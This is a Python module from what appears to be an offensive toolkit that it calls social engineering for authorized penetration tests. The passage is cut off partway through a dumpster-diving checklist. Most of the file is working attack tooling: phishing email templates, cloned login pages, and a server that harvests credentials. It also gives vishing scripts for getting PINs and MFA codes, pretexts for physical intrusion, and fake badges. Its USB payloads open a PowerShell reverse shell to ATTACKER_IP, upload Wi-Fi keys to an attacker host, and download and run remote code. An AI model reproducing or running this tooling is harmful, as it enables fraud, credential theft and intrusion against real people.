#!/usr/bin/env python3
"""
═══════════════════════════════════════════════════════════════
        SOCIAL ENGINEERING MODULE - BlackSentinel Strike v4.0
═══════════════════════════════════════════════════════════════
"""

import subprocess
import os
import threading
import tempfile
import json
import hashlib
from datetime import datetime


class SocialEngineeringModule:
    """Advanced social engineering module for authorized penetration testing"""

    def __init__(self, callback=None):
        self.callback = callback
        self.results = {}
        self.is_running = False
        self.harvested_credentials = []
        self.active_servers = []

    def log(self, message, level="info"):
        """Log message"""
        if self.callback:
            self.callback(message, level)

    # ─────────────────────────────────────────────────────────────
    #  PHISHING EMAIL
    # ─────────────────────────────────────────────────────────────
    def phishing_email_create(self, target_name, target_email, template="invoice"):
        """Create phishing email with multiple templates."""
        templates = {
            "invoice": {
                "subject": "ACTION REQUIRED: Outstanding Invoice #{ref}",
                "body": (
                    "Dear {name},\n\n"
                    "Our records indicate an outstanding balance on your account. "
                    "Please review the attached invoice and submit payment at your earliest "
                    "convenience to avoid service interruption.\n\n"
                    "View Invoice: {url}\n\n"
                    "If you believe this is an error, contact our billing department immediately.\n\n"
                    "Best regards,\nAccounts Payable\n{org}"
                ),
                "sender_display": "Billing Department",
                "urgency": "high",
            },
            "shipping": {
                "subject": "Your package could not be delivered - #{ref}",
                "body": (
                    "Hello {name},\n\n"
                    "We attempted to deliver your package but no one was available to sign for it. "
                    "Please confirm your delivery details within 24 hours or the package will be "
                    "returned to sender.\n\n"
                    "Track Package: {url}\n\n"
                    "Thank you,\n{org} Delivery Services"
                ),
                "sender_display": "Shipping Notifications",
                "urgency": "high",
            },
            "password_reset": {
                "subject": "Password Reset Request - Action Required",
                "body": (
                    "Hi {name},\n\n"
                    "A password reset was requested for your account. If this was you, click "
                    "the link below to set a new password. This link expires in 30 minutes.\n\n"
                    "Reset Password: {url}\n\n"
                    "If you did not request this change, please secure your account immediately.\n\n"
                    "{org} Security Team"
                ),
                "sender_display": "IT Security",
                "urgency": "critical",
            },
            "bank": {
                "subject": "Security Alert: Unusual activity detected on your account",
                "body": (
                    "Dear {name},\n\n"
                    "We have detected unusual activity on your account. For your protection, "
                    "we have temporarily restricted access. Please verify your identity to "
                    "restore full access.\n\n"
                    "Verify Account: {url}\n\n"
                    "Do not share your credentials with anyone. Our team will never ask for "
                    "your password.\n\n"
                    "{org} Fraud Prevention"
                ),
                "sender_display": "Fraud Prevention Team",
                "urgency": "critical",
            },
            "social_media": {
                "subject": "Your {service} account has been compromised",
                "body": (
                    "Hi {name},\n\n"
                    "We detected a login from an unrecognized device in an unusual location. "
                    "Your account security may be at risk. Please review your recent activity "
                    "and secure your account.\n\n"
                    "Review Activity: {url}\n\n"
                    "If this wasn't you, change your password immediately.\n\n"
                    "{org} Support Team"
                ),
                "sender_display": "Account Security",
                "urgency": "high",
            },
            "IT_support": {
                "subject": "Mandatory: Security Patch Installation Required",
                "body": (
                    "Hello {name},\n\n"
                    "IT has identified a critical vulnerability that requires immediate patching "
                    "on your workstation. Please download and install the security update using "
                    "the link below before end of business today.\n\n"
                    "Download Patch: {url}\n\n"
                    "Failure to comply may result in temporary network disconnection.\n\n"
                    "{org} IT Department"
                ),
                "sender_display": "IT Helpdesk",
                "urgency": "high",
            },
            "CEO_fraud": {
                "subject": "Urgent - Need your help with something confidential",
                "body": (
                    "Hi {name},\n\n"
                    "I'm in a meeting and can't talk right now. I need you to handle something "
                    "time-sensitive for me. Please process an urgent wire transfer using the "
                    "details at the link below. This is confidential - please don't discuss "
                    "with anyone else.\n\n"
                    "Transfer Details: {url}\n\n"
                    "Thanks,\n{org} CEO"
                ),
                "sender_display": "CEO Office",
                "urgency": "critical",
            },
        }

        self.log(f"Creating phishing email ({template}) for {target_email}", "warning")

        if template not in templates:
            self.log(f"Unknown template '{template}', falling back to invoice", "error")
            template = "invoice"

        t = templates[template]
        ref = hashlib.md5(target_email.encode()).hexdigest()[:8].upper()

        body = t["body"].format(
            name=target_name,
            url=f"http://PHISHING_SERVER_URL/{ref}",
            ref=ref,
            service=template.replace("_", " ").title(),
            org=target_email.split("@")[-1].split(".")[0].title(),
        )

        result = {
            "to": target_email,
            "to_name": target_name,
            "from_display": t["sender_display"],
            "subject": t["subject"].format(ref=ref, name=target_name),
            "body": body,
            "template": template,
            "urgency": t["urgency"],
            "reference": ref,
            "created_at": datetime.now().isoformat(),
        }

        self.results.setdefault("phishing_emails", []).append(result)
        self.log(f"Phishing email created (ref={ref})", "success")
        return result

    # ─────────────────────────────────────────────────────────────
    #  PHISHING PAGE CLONE
    # ─────────────────────────────────────────────────────────────
    def phishing_page_create(self, target_service, output_dir=None):
        """Clone a login page for credential harvesting."""
        if output_dir is None:
            output_dir = os.path.join(tempfile.gettempdir(), "phishing_pages")

        self.log(f"Cloning login page for: {target_service}", "warning")
        os.makedirs(output_dir, exist_ok=True)

        service_lower = target_service.lower().replace(" ", "")

        built_in = {
            "facebook", "google", "linkedin", "office365", "microsoft",
            "apple", "github", "twitter", "instagram", "dropbox",
        }

        if service_lower in built_in:
            template_func = getattr(self, f"_{service_lower}_template", None)
            if template_func:
                html_content = template_func()
            else:
                html_content = self._generic_login_template(target_service)
        else:
            html_content = self._generic_login_template(target_service)

        output_file = os.path.join(output_dir, f"{service_lower}_login.html")
        with open(output_file, "w") as f:
            f.write(html_content)

        result = {
            "service": target_service,
            "output_file": output_file,
            "output_dir": output_dir,
            "timestamp": datetime.now().isoformat(),
        }

        self.results["phishing_page"] = result
        self.log(f"Phishing page created: {output_file}", "success")
        return result

    # ─────────────────────────────────────────────────────────────
    #  PHISHING / CREDENTIAL HARVESTING SERVER
    # ─────────────────────────────────────────────────────────────
    def phishing_server_start(self, port=8080):
        """Start a credential-harvesting HTTP server in a background thread."""
        self.log(f"Starting credential harvester on port {port}", "warning")

        creds_file = os.path.join(tempfile.gettempdir(), "harvested_creds.json")

        harvester_script = os.path.join(tempfile.gettempdir(), "se_harvester.py")
        script = f'''#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse, json, os, datetime

CREDS_FILE = "{creds_file}"

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode("utf-8", errors="replace")
        params = urllib.parse.parse_qs(body)
        entry = {{
            "timestamp": datetime.datetime.now().isoformat(),
            "path": self.path,
            "credentials": {{k: v[0] if v else "" for k, v in params.items()}},
            "raw": body,
        }}
        with open(CREDS_FILE, "a") as f:
            f.write(json.dumps(entry) + "\\n")
        self.send_response(302)
        self.send_header("Location", "https://example.com")
        self.end_headers()

    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(b"<html><body><h1>Maintenance</h1></body></html>")

    def log_message(self, fmt, *args):
        pass

server = HTTPServer(("0.0.0.0", {port}), Handler)
print(f"[SE] Harvester listening on {port}")
server.serve_forever()
'''
        with open(harvester_script, "w") as f:
            f.write(script)

        def _run():
            try:
                subprocess.run(["python3", harvester_script], timeout=3600)
            except Exception:
                pass

        t = threading.Thread(target=_run, daemon=True)
        t.start()
        self.active_servers.append({"port": port, "thread": t, "creds_file": creds_file})

        result = {
            "status": "active",
            "port": port,
            "creds_file": creds_file,
            "pid": t.ident,
        }
        self.results["harvester_server"] = result
        self.log(f"Harvester active on port {port}", "success")
        return result

    # ─────────────────────────────────────────────────────────────
    #  VISHING (VOICE PHISHING)
    # ─────────────────────────────────────────────────────────────
    def vishing_script(self, target, scenario):
        """Generate a vishing (voice phishing) call script."""
        scenarios = {
            "IT_helpdesk": {
                "title": "IT Helpdesk Password Reset",
                "steps": [
                    "Identify yourself as IT Helpdesk from {target}'s internal support team.",
                    "Explain that a security audit has flagged the account for mandatory password rotation.",
                    "Ask the user to confirm their employee ID and current username.",
                    "Guide them through 'resetting' their password via a link you will text/email.",
                    "Collect any MFA codes they receive under the pretence of verifying the reset.",
                ],
                "small_talk": [
                    "How's your day going? I know these calls are inconvenient.",
                    "Sorry for the hassle, we're just trying to keep everyone's accounts secure.",
                ],
                "objection_handling": [
                    "If they ask to call back: 'This is a priority audit - I won't be available later today.'",
                    "If they refuse: 'Your account will be temporarily locked until verification is complete.'",
                ],
            },
            "bank_fraud": {
                "title": "Bank Fraud Department",
                "steps": [
                    "Identify yourself as calling from {target}'s fraud prevention team.",
                    "State that a suspicious international transaction was detected.",
                    "Ask the user to verify recent transactions (provide fake ones).",
                    "Request card number and PIN to 'block the fraudulent charge'.",
                    "Offer to issue a replacement card expedited to their address.",
                ],
                "small_talk": [
                    "I understand this is stressful - I'll help you resolve this quickly.",
                    "We catch most fraud early, you're lucky we flagged this in time.",
                ],
                "objection_handling": [
                    "If they want to hang up: 'Ma'am/Sir, the fraudulent charge is still processing - every minute counts.'",
                    "If they ask for a call-back number: give a spoofed number matching the bank's prefix.",
                ],
            },
            "delivery": {
                "title": "Package Delivery Issue",
                "steps": [
                    "Claim to be calling from a delivery service about a package for {target}.",
                    "Say the address label was damaged and you need to confirm the delivery address.",
                    "Mention the package requires a signature and a small customs/delivery fee.",
                    "Offer to 'waive the fee' if they confirm their payment details now.",
                    "Collect full name, address, and payment information.",
                ],
                "small_talk": [
                    "It's been a busy day for deliveries - lots of packages going out!",
                    "This looks like a nice package - must be something good!",
                ],
                "objection_handling": [
                    "If they say they didn't order anything: 'Maybe it's a gift from a friend? Can we still deliver it?'",
                    "If they refuse payment info: 'We can hold it at the depot for 24 hours, but a small fee applies.'",
                ],
            },
            "CEO_impersonation": {
                "title": "Executive / CEO Impersonation (Internal)",
                "steps": [
                    "Impersonate a senior executive at {target}.",
                    "Claim to be travelling and in a meeting where they can't use their usual device.",
                    "Ask for a favour: purchase gift cards for a client, wire funds, or share a confidential file.",
                    "Create urgency: 'I need this done in the next 30 minutes - can you handle it?'",
                    "Provide a payment method or request credentials to 'access the shared drive'.",
                ],
                "small_talk": [
                    "Sorry I'm rushed - this client dinner is running long.",
                    "You're the only person I trust to handle this quietly.",
                ],
                "objection_handling": [
                    "If they say it seems unusual: 'I know, I wouldn't ask if it wasn't urgent.'",
                    "If they want to verify: 'Call me on my personal line' (give a second spoofed number).",
                ],
            },
        }

        self.log(f"Generating vishing script ({scenario}) for {target}", "warning")

        if scenario not in scenarios:
            self.log(f"Unknown scenario '{scenario}', using IT_helpdesk", "error")
            scenario = "IT_helpdesk"

        s = scenarios[scenario]
        result = {
            "target": target,
            "scenario": scenario,
            "title": s["title"],
            "steps": [step.format(target=target) for step in s["steps"]],
            "small_talk": s["small_talk"],
            "objection_handling": s["objection_handling"],
            "tips": [
                "Speak slowly and confidently.",
                "Use the target's first name to build rapport.",
                "Have a colleague nearby to monitor and record the engagement.",
                "Stop immediately if the target becomes distressed.",
            ],
            "created_at": datetime.now().isoformat(),
        }

        self.results.setdefault("vishing_scripts", []).append(result)
        self.log(f"Vishing script generated: {s['title']}", "success")
        return result

    # ─────────────────────────────────────────────────────────────
    #  SMISHING (SMS PHISHING)
    # ─────────────────────────────────────────────────────────────
    def smishing_create(self, target, message_type="delivery"):
        """Generate SMS phishing messages."""
        message_types = {
            "delivery": [
                "{target}: Your package is ready for pickup. Confirm delivery address: {url}",
                "USPS: A delivery attempt was made. Reschedule here: {url}",
                "FedEx: Your shipment is on hold. Update info to release: {url}",
            ],
            "bank": [
                "{target}: Unusual login detected on your account. Verify identity: {url}",
                "SECURITY ALERT: A $2,499 transaction was flagged. Confirm: {url}",
                "Your account has been limited. Restore access: {url}",
            ],
            "tax": [
                "{target}: IRS notice - you have an unclaimed refund. Claim now: {url}",
                "Tax Refund: $3,200 refund pending. Verify to receive: {url}",
                "Important: Your tax return needs additional documentation: {url}",
            ],
            "prize": [
                "{target}: Congratulations! You've won a $1,000 gift card. Claim: {url}",
                "You've been selected for an exclusive offer. Accept here: {url}",
                "WINNER: Claim your prize before it expires: {url}",
            ],
            "2fa_code": [
                "{target}: Your verification code is {code}. Do not share this code.",
                "Verification: {code} - If you didn't request this, call us immediately.",
                "Your security code: {code}. Expires in 5 minutes.",
            ],
        }

        self.log(f"Creating smishing message ({message_type}) for {target}", "warning")

        if message_type not in message_types:
            message_type = "delivery"

        import random
        template = random.choice(message_types[message_type])
        code = f"{random.randint(100000, 999999)}"

        message = template.format(target=target.split("@")[0].split()[0], url="http://bit.ly/XXXXX", code=code)

        result = {
            "target": target,
            "message_type": message_type,
            "message": message,
            "length": len(message),
            "created_at": datetime.now().isoformat(),
        }

        self.results.setdefault("smishing", []).append(result)
        self.log(f"Smishing message created ({len(message)} chars)", "success")
        return result

    # ─────────────────────────────────────────────────────────────
    #  PRETEXT GENERATION
    # ─────────────────────────────────────────────────────────────
    def pretext_generate(self, scenario):
        """Generate social engineering pretexts for physical / logical access."""
        pretexts = {
            "new_employee": {
                "title": "New Employee / Contractor",
                "identity": "You are a new hire starting today in the {dept} department.",
                "props": ["Fake employee badge (expired or temp)", "Laptop bag with branded sticker", "Offer letter printout"],
                "approach": "Walk in during morning rush, look confused, ask someone to hold the door or help find your desk.",
                "story": "I'm the new {dept} analyst. HR told me to report to floor 3 but I can't find the elevator.",
                "contingencies": [
                    "If challenged: 'Let me call my manager' and walk away.",
                    "If badge doesn't scan: 'This temp badge is acting up, can you let me in?'",
                ],
            },
            "it_support": {
                "title": "IT Support Technician",
                "identity": "You are from {org} IT, here for scheduled maintenance.",
                "props": ["IT-branded polo or lanyard", "Laptop and tool bag", "Fake work order printout"],
                "approach": "Enter through loading dock or back entrance. Announce you are here to fix the printers / network closet.",
                "story": "We got a ticket about network issues on this floor. I need to check the switch in closet {num}.",
                "contingencies": [
                    "If asked for work order: 'Let me check with dispatch' and walk away.",
                    "If they escort you: work on a visible laptop while chatting innocuously.",
                ],
            },
            "vendor_delivery": {
                "title": "Vendor / Delivery Person",
                "identity": "You are delivering supplies from a vendor the company uses.",
                "props": ["Branded clipboard", "Laminated fake delivery manifest", "Generic box or package"],
                "approach": "Carry packages through the front entrance. People often hold doors for someone carrying items.",
                "story": "Got a delivery for {dept}. Can you point me to the loading dock? I'm new to this route.",
                "contingencies": [
                    "If refused entry: 'I'll just leave it at reception then' and note what you observe.",
                    "If they ask to sign: scribble something and move on.",
                ],
            },
            "maintenance": {
                "title": "Maintenance / Facilities Worker",
                "identity": "You are here to inspect fire extinguishers / HVAC / sprinklers.",
                "props": ["High-vis vest", "Clipboard with inspection checklist", "Basic tools"],
                "approach": "Walk in confidently through any entrance. Maintenance staff rarely get questioned.",
                "story": "Fire marshal requires annual inspection. I need to check unit {num} on this floor.",
                "contingencies": [
                    "If asked who sent you: name a real facilities company.",
                    "If stopped: 'I'll reschedule with building management' and leave calmly.",
                ],
            },
            "intern": {
                "title": "College Intern",
                "identity": "You are a summer intern working on a special project.",
                "props": ["Casual dress, backpack", "University-branded item", "Printed 'project brief'"],
                "approach": "Look young and slightly lost. Ask employees to let you in or help with access.",
                "story": "I'm interning with {dept} this summer. My mentor told me to grab something from the server room but my badge doesn't work yet.",
                "contingencies": [
                    "If questioned: give a real employee name (from LinkedIn recon).",
                    "If denied: 'No worries, I'll email my manager' and leave.",
                ],
            },
        }

        self.log(f"Generating pretext: {scenario}", "warning")

        if scenario not in pretexts:
            self.log(f"Unknown scenario '{scenario}', available: {', '.join(pretexts.keys())}", "error")
            return {"error": f"Unknown scenario. Available: {list(pretexts.keys())}"}

        p = pretexts[scenario]
        result = {
            "scenario": scenario,
            "title": p["title"],
            "identity": p["identity"],
            "props": p["props"],
            "approach": p["approach"],
            "story": p["story"],
            "contingencies": p["contingencies"],
            "legal_note": "This pretext is for authorized testing only. Ensure written permission (ROE) is obtained.",
            "created_at": datetime.now().isoformat(),
        }

        self.results.setdefault("pretexts", []).append(result)
        self.log(f"Pretext generated: {p['title']}", "success")
        return result

    # ─────────────────────────────────────────────────────────────
    #  BADGE CLONE
    # ─────────────────────────────────────────────────────────────
    def badge_clone(self, target_org):
        """Generate a fake badge template description and HTML mockup."""
        self.log(f"Generating badge clone for: {target_org}", "warning")

        org_clean = target_org.replace(" ", "_").lower()
        output_dir = os.path.join(tempfile.gettempdir(), "badge_templates")
        os.makedirs(output_dir, exist_ok=True)

        badge_html = f"""<!DOCTYPE html>
<html>
<head>
<title>{target_org} - Employee Badge</title>
<style>
  body {{ display: flex; justify-content: center; align-items: center; min-height: 100vh; background: #222; }}
  .badge {{ width: 340px; height: 216px; background: #fff; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,.4); padding: 20px; font-family: Arial, sans-serif; position: relative; overflow: hidden; }}
  .badge::before {{ content: ''; position: absolute; top: 0; left: 0; right: 0; height: 6px; background: #1a73e8; }}
  .org {{ font-size: 14px; font-weight: bold; color: #1a73e8; text-transform: uppercase; letter-spacing: 2px; margin-top: 8px; }}
  .photo {{ width: 80px; height: 80px; border-radius: 50%; background: #ddd; margin: 12px 0; display: flex; align-items: center; justify-content: center; font-size: 32px; color: #999; }}
  .name {{ font-size: 18px; font-weight: bold; color: #333; }}
  .title {{ font-size: 12px; color: #666; }}
  .id {{ font-size: 11px; color: #999; margin-top: 8px; }}
  .barcode {{ margin-top: 8px; text-align: center; font-size: 10px; color: #333; letter-spacing: 3px; }}
  .barcode div {{ background: #333; color: #fff; padding: 2px 8px; display: inline-block; border-radius: 2px; }}
</style>
</head>
<body>
<div class="badge">
  <div class="org">{target_org}</div>
  <div class="photo">PHOTO</div>
  <div class="name">John Doe</div>
  <div class="title">Software Engineer</div>
  <div class="id">EMP-2024-0042 | Active</div>
  <div class="barcode"><div>|||||||||||||||||</div></div>
</div>
</body>
</html>"""

        output_file = os.path.join(output_dir, f"{org_clean}_badge.html")
        with open(output_file, "w") as f:
            f.write(badge_html)

        result = {
            "org": target_org,
            "output_file": output_file,
            "notes": [
                "Replace PHOTO placeholder with actual photo.",
                "Update name, title, and employee ID as needed.",
                "Print on PVC card stock for realistic feel.",
                "Clone proximity stripe data if physical access is in scope.",
            ],
            "created_at": datetime.now().isoformat(),
        }

        self.results["badge_clone"] = result
        self.log(f"Badge template created: {output_file}", "success")
        return result

    # ─────────────────────────────────────────────────────────────
    #  USB RUBBER DUCKY
    # ─────────────────────────────────────────────────────────────
    def usb_rubber_ducky(self, payload_type="reverse_shell"):
        """Generate USB Rubber Ducky scripts (DuckyScript)."""
        payloads = {
            "reverse_shell": {
                "title": "Reverse Shell Payload",
                "description": "Opens a reverse shell to the attacker machine.",
                "script": (
                    "REM Title: Reverse Shell\n"
                    "REM Author: Pentest Team\n"
                    "DELAY 1000\n"
                    "GUI r\n"
                    "DELAY 500\n"
                    "STRING cmd\n"
                    "ENTER\n"
                    "DELAY 1000\n"
                    "STRING powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($rb,0,$rb.Length)}\"\n"
                    "ENTER\n"
                ),
            },
            "credential_dump": {
                "title": "Credential Dump",
                "description": "Dumps saved browser passwords and Wi-Fi credentials.",
                "script": (
                    "REM Title: Credential Dump\n"
                    "DELAY 1000\n"
                    "GUI r\n"
                    "DELAY 500\n"
                    "STRING cmd\n"
                    "ENTER\n"
                    "DELAY 1000\n"
                    "STRING powershell -nop -w hidden -c \"Start-Process cmd -ArgumentList '/c netsh wlan export profile key=plain > %TEMP%\\wifi.txt 2>&1 & type %TEMP%\\wifi.txt' -WindowStyle Hidden\"\n"
                    "ENTER\n"
                ),
            },
            "lock_screen": {
                "title": "Lock Screen Prank",
                "description": "Locks the workstation (harmless prank payload).",
                "script": (
                    "REM Title: Lock Screen\n"
                    "DELAY 2000\n"
                    "GUI l\n"
                ),
            },
            "screenshot_exfil": {
                "title": "Screenshot Exfiltration",
                "description": "Takes screenshots and copies them to USB.",
                "script": (
                    "REM Title: Screenshot Exfil\n"
                    "DELAY 1000\n"
                    "GUI r\n"
                    "DELAY 500\n"
                    "STRING cmd\n"
                    "ENTER\n"
                    "DELAY 1000\n"
                    "STRING powershell -nop -w hidden -c \"for($i=0;$i -lt 5;$i++){Start-Sleep 60; Add-Type -AssemblyName System.Windows.Forms; $b=New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width,[System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height); $g=[System.Drawing.Graphics]::FromImage($b); $g.CopyFromScreen(0,0,0,0,$b.Size); $b.Save('%TEMP%\\screenshot_'+$i+'.png'); Copy-Item '%TEMP%\\screenshot_'+$i+'.png' D:\\ -Force}\"\n"
                    "ENTER\n"
                ),
            },
            "powershell_exec": {
                "title": "Custom PowerShell Execution",
                "description": "Runs an arbitrary PowerShell command.",
                "script": (
                    "REM Title: PowerShell Exec\n"
                    "DELAY 1000\n"
                    "GUI r\n"
                    "DELAY 500\n"
                    "STRING powershell\n"
                    "ENTER\n"
                    "DELAY 1000\n"
                    "STRING YOUR_COMMAND_HERE\n"
                    "ENTER\n"
                ),
            },
        }

        self.log(f"Generating Rubber Ducky payload: {payload_type}", "warning")

        if payload_type not in payloads:
            payload_type = "lock_screen"

        p = payloads[payload_type]
        output_dir = os.path.join(tempfile.gettempdir(), "rubber_ducky")
        os.makedirs(output_dir, exist_ok=True)

        output_file = os.path.join(output_dir, f"{payload_type}.txt")
        with open(output_file, "w") as f:
            f.write(p["script"])

        result = {
            "payload_type": payload_type,
            "title": p["title"],
            "description": p["description"],
            "output_file": output_file,
            "compile_command": f"java -jar encoder.jar -i {output_file} -o inject.bin",
            "notes": "Compile with DuckyCoder / ducktoolkit before loading to SD card.",
            "created_at": datetime.now().isoformat(),
        }

        self.results["rubber_ducky"] = result
        self.log(f"Ducky payload created: {output_file}", "success")
        return result

    # ─────────────────────────────────────────────────────────────
    #  BADUSB ATTACK
    # ─────────────────────────────────────────────────────────────
    def badusb_attack(self, payload="keystroke_inject"):
        """Generate BadUSB payloads for compatible devices (O.MG Cable, Flipper Zero, etc.)."""
        payloads = {
            "keystroke_inject": {
                "title": "Keystroke Injection",
                "description": "Types and executes commands via HID emulation.",
                "script": (
                    "REM === BadUSB Keystroke Injection ===\n"
                    "DELAY 2000\n"
                    "REM Open terminal\n"
                    "CTRL SHIFT t\n"
                    "DELAY 500\n"
                    "REM Execute payload\n"
                    "STRING echo 'BadUSB test - unauthorized access demonstrated'\n"
                    "ENTER\n"
                ),
                "platform": "universal",
            },
            "wifi_creds_exfil": {
                "title": "Wi-Fi Credentials Exfil",
                "description": "Extracts Wi-Fi profiles and sends to attacker.",
                "script": (
                    "REM === Wi-Fi Cred Exfil ===\n"
                    "DELAY 2000\n"
                    "CTRL SHIFT t\n"
                    "DELAY 500\n"
                    "STRING powershell -w hidden -c \"$p=netsh wlan export profile key=plain|% Select-String keyMaterial; $c=New-Object Net.WebClient; $c.UploadString('http://ATTACKER/exfil',$p)\"\n"
                    "ENTER\n"
                ),
                "platform": "windows",
            },
            "lock_workstation": {
                "title": "Lock Workstation",
                "description": "Instantly locks the workstation.",
                "script": "DELAY 2000\nGUI l\n",
                "platform": "windows",
            },
            "reverse_shell": {
                "title": "Reverse Shell via BadUSB",
                "description": "Opens a reverse shell.",
                "script": (
                    "REM === BadUSB Reverse Shell ===\n"
                    "DELAY 2000\n"
                    "CTRL SHIFT t\n"
                    "DELAY 500\n"
                    "STRING powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')\"\n"
                    "ENTER\n"
                ),
                "platform": "windows",
            },
        }

        self.log(f"Generating BadUSB payload: {payload}", "warning")

        if payload not in payloads:
            payload = "keystroke_inject"

        p = payloads[payload]
        output_dir = os.path.join(tempfile.gettempdir(), "badusb")
        os.makedirs(output_dir, exist_ok=True)

        output_file = os.path.join(output_dir, f"{payload}.txt")
        with open(output_file, "w") as f:
            f.write(p["script"])

        result = {
            "payload": payload,
            "title": p["title"],
            "description": p["description"],
            "platform": p["platform"],
            "output_file": output_file,
            "compatible_devices": ["O.MG Cable", "Flipper Zero", "Arduino Leonardo", "Hak5 USB Cable"],
            "created_at": datetime.now().isoformat(),
        }

        self.results["badusb"] = result
        self.log(f"BadUSB payload created: {output_file}", "success")
        return result

    # ─────────────────────────────────────────────────────────────
    #  QR CODE PHISHING
    # ─────────────────────────────────────────────────────────────
    def qrcode_phishing(self, url):
        """Generate a malicious QR code for phishing (uses qrcode library if available)."""
        self.log(f"Generating QR code for phishing URL: {url}", "warning")

        output_dir = os.path.join(tempfile.gettempdir(), "qr_phishing")
        os.makedirs(output_dir, exist_ok=True)
        output_file = os.path.join(output_dir, "phish_qr.png")

        try:
            import qrcode
            img = qrcode.make(url)
            img.save(output_file)
            method = "qrcode_lib"
        except ImportError:
            # Fallback: generate SVG with plain Python
            svg_content = self._generate_qr_svg(url)
            output_svg = os.path.join(output_dir, "phish_qr.svg")
            with open(output_svg, "w") as f:
                f.write(svg_content)
            output_file = output_svg
            method = "svg_fallback"

        result = {
            "url": url,
            "output_file": output_file,
            "method": method,
            "tips": [
                "Print QR codes and place them in target locations (parking lot, elevator, break room).",
                "Shorten the URL first to make the QR less suspicious.",
                "Use a URL shortener with tracking for click analytics.",
            ],
            "created_at": datetime.now().isoformat(),
        }

        self.results["qr_phishing"] = result
        self.log(f"QR code created: {output_file}", "success")
        return result

    def _generate_qr_svg(self, url):
        """Minimal QR-like SVG placeholder (real implementation should use qrcode lib)."""
        return f"""<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="300" height="300" viewBox="0 0 300 300">
  <rect width="300" height="300" fill="white"/>
  <text x="150" y="140" text-anchor="middle" font-family="Arial" font-size="14" fill="black">QR Code Placeholder</text>
  <text x="150" y="165" text-anchor="middle" font-family="Arial" font-size="10" fill="gray">{url[:50]}</text>
  <text x="150" y="190" text-anchor="middle" font-family="Arial" font-size="10" fill="gray">Install 'qrcode' for real QR generation</text>
</svg>"""

    # ─────────────────────────────────────────────────────────────
    #  WATERING HOLE ATTACK
    # ─────────────────────────────────────────────────────────────
    def water_hole_attack(self, targets):
        """Configure a watering hole attack (compromise a site frequented by targets)."""
        self.log(f"Configuring watering hole attack for {len(targets)} target(s)", "warning")

        output_dir = os.path.join(tempfile.gettempdir(), "watering_hole")
        os.makedirs(output_dir, exist_ok=True)

        config = {
            "targets": targets,
            "techniques": [
                {
                    "name": "JavaScript Injection",
                    "description": "Inject beacon JS into a site the targets frequently visit.",
                    "setup": (
                        "1. Identify a site the targets visit (industry forum, news site, tool vendor).\n"
                        "2. Gain access to the site (XSS, compromised admin, supply chain).\n"
                        "3. Inject a tracking/beacon script:\n"
                        "   <script src='http://ATTACKER/tracker.js'></script>\n"
                        "4. The script fingerprints visitors and exfils data to your server."
                    ),
                },
                {
                    "name": "Watering Hole + Browser Exploit",
                    "description": "Serve a browser exploit to visitors matching target profile.",
                    "setup": (
                        "1. Compromise a site frequented by targets.\n"
                        "2. Use a framework like BeEF or a custom exploit.\n"
                        "3. Filter visitors by IP range, user-agent, or geography.\n"
                        "4. Deliver payload only to target organization IPs."
                    ),
                },
                {
                    "name": "Malicious Download",
                    "description": "Replace a legitimate software download with a trojanized version.",
                    "setup": (
                        "1. Identify software the targets download from a vendor site.\n"
                        "2. Compromise the download server or MITM the download.\n"
                        "3. Replace the binary with a trojanized version.\n"
                        "4. Targets install it thinking it's legitimate."
                    ),
                },
            ],
            "infrastructure": {
                "c2_server": "Set up a Command & Control server on a VPS.",
                "payload_server": "Host the malicious payload on a separate server.",
                "redirector": "Use a CDN or redirector to mask the C2 infrastructure.",
                "domain": "Register a domain similar to the target site.",
            },
            "created_at": datetime.now().isoformat(),
        }

        output_file = os.path.join(output_dir, "watering_hole_config.json")
        with open(output_file, "w") as f:
            json.dump(config, f, indent=2)

        self.results["watering_hole"] = config
        self.log(f"Watering hole config created: {output_file}", "success")
        return config

    # ─────────────────────────────────────────────────────────────
    #  SHOULDER SURFING
    # ─────────────────────────────────────────────────────────────
    def shoulder_surfing_kit(self):
        """Generate shoulder surfing observation guides."""
        kit = {
            "title": "Shoulder Surfing Observation Kit",
            "locations": [
                {"name": "Coffee Shop", "description": "Sit nearby with laptop/tablet, observe screens and keyboards."},
                {"name": "Elevator", "description": "Stand behind target, observe PINs, phone screens, badge details."},
                {"name": "Parking Lot", "description": "Watch for badge swipes, tailgating opportunities."},
                {"name": "Airport / Lounge", "description": "Targets often work on sensitive documents during travel."},
                {"name": "Co-working Space", "description": "Shared desks make screen observation easy."},
            ],
            "equipment": [
                "Compact camera or phone with good zoom",
                "Small notepad for recording observations",
                "Binoculars for long-range observation",
                "Polarized glasses (reduce screen glare for others, improve your view)",
                "Noise recorder (for verbal PINs over phone)",
            ],
            "what_to_observe": [
                "Login credentials (username format, password length)",
                "PINs entered at keypads (ATM, door access, phone lock)",
                "Badge numbers and access patterns",
                "Screen contents (emails, documents, internal tools)",
                "Phone unlock patterns or passwords",
                "Sensitive conversations (especially on phones in public)",
            ],
            "legal_note": "Only observe in public spaces. Do not use recording devices where privacy is expected. Get written authorization.",
            "created_at": datetime.now().isoformat(),
        }

        self.results["shoulder_surfing"] = kit
        self.log("Shoulder surfing kit generated", "success")
        return kit

    # ─────────────────────────────────────────────────────────────
    #  DUMPSTER DIVING
    # ─────────────────────────────────────────────────────────────
    def dumpster_diving_checklist(self):
        """Generate dumpster diving checklist for physical pen testing."""
        checklist = {
            "title": "Dumpster Diving Checklist",
            "preparation": [
                "Obtain written authorization from the client.",
                "Identify dumpster locations (main dump, recycling, executive waste).",
                "Schedule the dive for early morning (less traffic, less risk).",
